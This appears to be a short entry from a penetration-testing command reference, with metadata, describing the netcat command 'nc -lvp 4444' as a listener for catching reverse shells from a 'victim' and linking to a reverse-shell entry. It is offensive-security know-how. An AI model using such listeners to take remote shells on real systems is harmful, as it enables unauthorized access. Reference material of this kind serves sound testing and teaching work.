---
data: nc -lvp 4444
tags:
  - listener
type: command
executor: bash
platforms:
  - Linux
id: d6e7ddc9-8651-43aa-a5a6-e8991a7f8718
created_at: '2025-12-14T04:08:48.080Z'
updated_at: '2025-12-14T04:08:48.080Z'
verified: false
validated: true
submitted: true
---
# NC Listen for Shell

## Command

```bash
nc -lvp 4444
```

## Description

Listens for incoming TCP connections on a port, providing verbose output for catching reverse shells.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -l | Listen mode | Yes |
| -v | Verbose | Yes |
| -p port | Port to listen on | Yes |

## Examples

### Basic Usage

```bash
nc -lvp 4444
```

## Expected Output

Connection from victim IP, followed by shell prompt.

## Related

- [[commands/bash-reverse-shell-to-attacker]]
